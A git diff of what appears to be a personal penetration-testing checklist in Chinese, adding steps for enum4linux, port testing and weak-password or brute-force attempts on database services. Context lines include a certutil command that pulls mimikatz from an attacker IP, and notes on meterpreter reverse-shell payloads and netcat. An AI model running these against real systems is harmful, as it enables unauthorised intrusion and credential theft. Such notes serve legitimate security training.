@@ -1,5 +1,5 @@
 1.nmap全端口,script,udp
-2.
+2.enum4linux 測試
 3.nikto
 4.davtest
 5.每個資料夾gobuster
@@ -24,6 +24,8 @@ certutil.exe -urlcache -split -f http://10.10.14.8/mimikatz_trunk.exe mimikatz_t
 4.nc多嘗試幾個版本
 5.winpeas.exe多嘗試幾個
 6.certutil及curl可以嘗試下載
+7.不同端口測試
+
 ###
 windows/meterpreter/reverse_tcp 斜線是不穩定,給mutil handler使用,容量大
 windows/meterpreter_reverse_tcp 底線是穩定,容量小
@@ -44,3 +46,7 @@ windows/meterpreter_reverse_tcp 底線是穩定,容量小
 
 ###掃出來的每個port都要仔細看,查詢是什麼用途
 ###根據port直接pycharm搜紀錄
+
+
+###數據庫服務嘗試弱密碼登入及暴力破解
+
